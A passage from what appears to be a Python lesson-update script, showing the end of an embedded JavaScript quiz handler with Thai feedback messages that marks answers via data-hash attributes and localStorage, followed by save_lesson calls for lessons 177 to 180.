    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

# ─── Execute updates ───
save_lesson(177, val177_0, val177_1, val177_2)
save_lesson(178, val178_0, val178_1, val178_2)
save_lesson(179, val179_0, val179_1, val179_2)
save_lesson(180, val180_0, val180_1, val180_2)
ctx.pop()
